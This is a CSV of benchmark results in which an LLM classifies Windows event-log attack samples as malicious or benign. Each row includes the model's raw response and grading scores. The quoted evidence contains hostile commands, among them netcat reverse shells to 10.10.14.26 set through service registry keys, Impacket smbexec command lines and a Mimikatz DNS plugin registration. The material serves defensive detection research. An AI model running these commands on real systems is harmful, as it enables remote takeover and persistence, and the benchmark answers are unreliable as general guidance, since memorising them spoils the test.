# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
claude-opus-4-8,ID4688-Service permissions modified (sc).evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe",admmig,"sc  sdset xboxgip ""D:(A | CCLCSWRPWPDTLOCRRC | SY)",,,0.0,4.02,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\sc.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: sc  sdset xboxgip ""D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
- Network: None
- Registry: None

EXPLANATION:
The use of sc.exe with the ""sdset"" subcommand modifies the security descriptor (DACL) of the xboxgip service, which is a known technique to weaken or alter service permissions and potentially establish persistence or evade detection. This security descriptor manipulation, spawned from cmd.exe, is not routine administrative activity and is consistent with malicious tampering of service access controls."
claude-opus-4-8,ID4697-New service for Mimikatz.evtx,easy,A,processed,YES,100.0,83.3,YES,"1102, 4697",mimidrv.sys,admmig,,,,0.0,3.37,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4697
- Processes: mimidrv.sys
- Accounts: admmig
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event 1102) by account admmig, immediately followed by the installation of a kernel-mode service ""mimidrv"" pointing to mimidrv.sys within a Mimikatz tool directory (Event 4697), running as LocalSystem. The combination of log clearing to cover tracks and installation of the Mimikatz driver for credential theft is a clear attack pattern."
claude-opus-4-8,ID7045-4697-SMBexec service registration.evtx,easy,A,processed,YES,100.0,87.5,YES,"7045, 4697","%COMSPEC%, execute.bat","LocalSystem, admmig",%COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat,"127.0.0.1, \\127.0.0.1\C$\__output",,0.0,5.66,5.2,5.0,4.0,3,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045, 4697
- Processes: %COMSPEC%, execute.bat
- Accounts: LocalSystem, admmig
- Commands: %COMSPEC% /Q /c echo cd  ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & %COMSPEC% /Q /c %TEMP%\execute.bat & del %TEMP%\execute.bat
- Network: 127.0.0.1, \\127.0.0.1\C$\__output
- Registry: None

EXPLANATION:
This is the signature pattern of a remote command execution tool (Impacket-style smbexec/atexec) that installs a temporary service named BTOBTO to run cmd.exe, redirect output to an SMB admin share (\\127.0.0.1\C$\__output), and then delete the batch file to cover its tracks. The service runs as LocalSystem on a domain controller (rootdc1.offsec.lan) and was created by the admmig account, consistent with lateral movement and privileged command execution rather than legitimate service installation."
claude-opus-4-8,ID7045-7036 PSexec service installation.evtx,easy,A,processed,YES,100.0,100.0,YES,"104, 7045, 7036","PSEXESVC.exe, PSEXESVC","admmig, LocalSystem",,,,0.0,4.24,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045, 7036
- Processes: PSEXESVC.exe, PSEXESVC
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event 104) by user admmig, immediately followed by the installation and execution of the PSEXESVC service (Event 7045) running as LocalSystem, which is the signature of PsExec-based remote execution. The tight sequence of log clearing followed by remote service creation and rapid start/stop (Events 7036) indicates anti-forensic activity combined with lateral movement, a strong attack pattern."
claude-opus-4-8,ID7045-New service for Mimikatz +npcap.evtx,easy,A,processed,YES,100.0,81.8,YES,7045,"test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys",LocalSystem,"D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",,,16.7,5.44,4.9,6.0,3.3,4,18.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045
- Processes: test.exe, OfficeClickToRun.exe, MicrosoftSearchInBing.exe, npcap.sys, mimidrv.sys
- Accounts: LocalSystem
- Commands: D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files (x86)\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Network: None
- Registry: None

EXPLANATION:
The installation of the ""mimikatz driver (mimidrv)"" kernel mode driver from C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys is a clear indicator of credential-dumping/attack tooling. Combined with the npcap packet driver and a suspicious generic ""test.exe"" service running as LocalSystem, this reflects malicious activity rather than routine service installation."
claude-opus-4-8,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,,,0.0,3.21,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The System event log was cleared (Event ID 104) by account admmig, immediately followed by the installation of a new service named ""bad-task"" with image path ""virusé.exe"" running as LocalSystem (Event ID 7045). This sequence of clearing logs to hide activity followed by a suspiciously named service installation with high privileges is a strong indicator of malicious activity and attacker persistence."
claude-opus-4-8,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,50.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26 4447,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,5.29,3.0,6.0,4.0,4,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26 4447
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The account OFFSEC\admmig used PowerShell to modify the xboxgip service registry key, setting a FailureCommand that launches netcat (C:\nc.exe) with the -e flag to spawn a powershell.exe reverse shell to 10.10.14.26 on port 4447. This is a classic service-recovery persistence/execution technique combined with a netcat reverse shell, which is clearly malicious behavior rather than routine administration."
claude-opus-4-8,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,83.3,YES,"800, 4103, 4104","powershell.exe, C:\nc.exe, nc.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""",10.10.14.26,HKLM:\System\CurrentControlSet\services\xboxgip,0.0,5.14,5.0,6.0,4.0,4,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe, C:\nc.exe, nc.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""
- Network: 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The user OFFSEC\admmig modified the ImagePath of the existing ""xboxgip"" service to point to netcat (nc.exe) configured to spawn a PowerShell reverse shell to 10.10.14.26 on port 4447. This is a clear service hijacking/persistence technique combined with a remote command-and-control reverse shell, which is malicious attack behavior."
claude-opus-4-8,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,62.5,YES,"800, 4104, 4103","powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'",,,0.0,4.22,3.8,6.0,4.0,4,17.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""'
- Network: None
- Registry: None

EXPLANATION:
A new Windows service named ""hackervirus"" was created via PowerShell pointing to a binary named ""virus.exe"", which is a common persistence and privilege-execution technique. The naming of both the service and binary, combined with the administrative account OFFSEC\admmig executing it, strongly indicates malicious intent rather than legitimate service installation."
claude-opus-4-8,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,73.3,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,"10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11","HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile",66.7,7.15,4.4,6.0,1.3,4,15.7,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: 10.23.42.38, 10.23.42.1, 10.23.42.10, 10.23.42.11
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile

EXPLANATION:
A suspiciously named service ""hacker23"" was created via services.exe with an auto-start value, indicating persistence. The wmiprvse.exe process (WMI, technique T1047) abuses the CrashControl\DumpFile registry value to store the binary output of an ipconfig /all command (host fs03vuln, IPs 10.23.42.38, gateway 10.23.42.1, DNS 10.23.42.10/11), a known fileless WMI exec/output-staging technique. The combination of unauthorized service persistence and WMI-based reconnaissance with results staged in the registry is clearly malicious."
claude-opus-4-8,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,"""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""",,,0.0,4.46,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: ""cmd.exe /c echo %ProcessId% >> c:\\\\temp\\\\log.txt""
- Network: None
- Registry: None

EXPLANATION:
The logs show creation of a paired WMI event consumer (Event ID 20) and WMI event filter (Event ID 19) both named ""Evil,"" which is a classic WMI event subscription persistence technique (T1047). The filter triggers on notepad.exe process start and the CommandLineEventConsumer executes cmd.exe, indicating an attacker establishing automated, fileless persistence. The deliberately named ""Evil"" subscription and the trigger-action binding across these events are strong indicators of malicious activity rather than routine administration."
claude-opus-4-8,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","netsh.exe, cmd.exe, mimikatz.exe",admmig,netsh  add helper  mimikatz.exe,,,0.0,3.69,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: netsh.exe, cmd.exe, mimikatz.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: None
- Registry: None

EXPLANATION:
The Security log was cleared (Event 1102) by account admmig, immediately followed by execution of netsh registering mimikatz.exe as a helper DLL — a known persistence and credential-theft technique. The sequence of log clearing (anti-forensics) followed by loading a credential-dumping tool via netsh by the same actor strongly indicates malicious activity."
claude-opus-4-8,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,NO,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,4.45,3.0,2.0,4.0,4,13.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
These are Active Directory object modification events (5136) where the admmig account changed the localizationDisplayId attribute on the User-Force-Change-Password extended-rights configuration object. The paired value-deleted/value-added operations represent a routine attribute update toggling a localization display value, consistent with normal directory administration rather than a privilege or ACL escalation. No suspicious process execution, command lines, or rights grants are present in the evidence."
claude-opus-4-8,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,"admmig, OFFSEC",,,,0.0,5.64,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig, OFFSEC
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The nTSecurityDescriptor of the AdminSDHolder container (CN=AdminSDHolder,CN=System,DC=offsec,DC=lan) was modified by account admmig, with the new ACL adding a full-control ACE (CCDCLCSWRPWPDTLOCRSDRCWDWO) for SID S-1-5-21-4230534742-2542757381-3142984815-1234 not present in the prior value. Modifying AdminSDHolder to grant a non-default principal full control is a well-known persistence/privilege-escalation technique that propagates rights to all protected/privileged accounts via SDProp, indicating malicious activity."
claude-opus-4-8,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,,,0.0,3.30,6.0,4.0,4.0,1,15.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
These are routine Microsoft-Windows-Wininit system events (Event IDs 14 and 12) related to ChkDsk/CHKDSK scan and boot configuration status on a single host. There are no processes, accounts, commands, or network indicators suggesting attack behavior, making this normal system activity."
claude-opus-4-8,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,,,0.0,2.90,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
Event ID 4664 indicates a hard link was created, in this case linking a Sysmon configuration file within the Admin user's Downloads directory. This is routine file system activity consistent with normal setup or configuration of the Sysmon monitoring tool, with no indicators of privilege escalation, suspicious commands, or network activity."
claude-opus-4-8,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,mimilib.dll,,,rootdc1.offsec.lan,,0.0,9.04,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
DNS Server Event ID 150 indicates a failure loading a server-level plugin DLL, and the referenced file "".\mimilib.dll"" is a known Mimikatz component used to abuse the DNS ServerLevelPluginDll feature for code execution/persistence on a domain controller. The repeated load attempts of this malicious DLL on a DC (rootdc1.offsec.lan) strongly indicate an attacker leveraging the DNS plugin mechanism for privileged execution."
claude-opus-4-8,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",,,0.0,4.47,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: None
- Registry: None

EXPLANATION:
This event shows dnscmd.exe being used to register a custom server-level plugin DLL (mimilib.dll) from a directory named ""Mimikatz-fev-2020"", a well-known DNS server abuse technique for code execution and persistence on a domain controller (rootdc1.offsec.lan). Loading the Mimikatz mimilib.dll as a DNS ServerLevelPluginDll allows arbitrary code execution in the context of the DNS service. The combination of the tool path, the plugin DLL configuration, and execution on a DC strongly indicates malicious activity."
claude-opus-4-8,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",mimilib.dll,,,rootdc1.offsec.lan,,0.0,3.41,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The DNS Server loaded a custom plugin DLL from C:\TOOLS\Mimikatz-fev-2020\mimilib.dll, which is the Mimikatz DNS server plugin used for DNS query logging/exfiltration and persistence. Loading an attacker tool DLL into the DNS service on a domain controller (rootdc1.offsec.lan) is highly indicative of malicious activity rather than legitimate administration."
claude-opus-4-8,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,,,0.0,4.00,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
This is a single Event 4673 showing a privileged service operation using SeMachineAccountPrivilege via lsass.exe on a domain controller, which is normal behavior for adding machine accounts to the domain. In isolation, with no paired escalation chain or sequential suspicious commands, this represents routine SAM/account-management activity. The username ""hack1"" is suggestive but the event alone does not constitute attack behavior."
